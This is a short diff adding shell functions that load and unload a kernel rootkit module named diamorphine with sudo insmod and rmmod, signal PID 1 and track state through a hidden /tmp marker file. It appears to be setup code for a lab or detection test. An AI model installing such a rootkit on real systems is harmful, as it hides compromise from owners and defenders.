@@ -1,0 +1,12 @@
+install_rootkit() {
+    [ -f /tmp/.rootkit_active ] && return 0
+    sudo insmod "$ASSETS_DIR/diamorphine.ko"
+    sudo kill -31 1
+    touch /tmp/.rootkit_active
+    echo "[+] Rootkit loaded"
+}
+clean_rootkit() {
+    sudo rmmod diamorphine 2>/dev/null || sudo rmmod --force diamorphine 2>/dev/null || true
+    rm -f /tmp/.rootkit_active
+    echo "[+] Rootkit cleaned"
+}
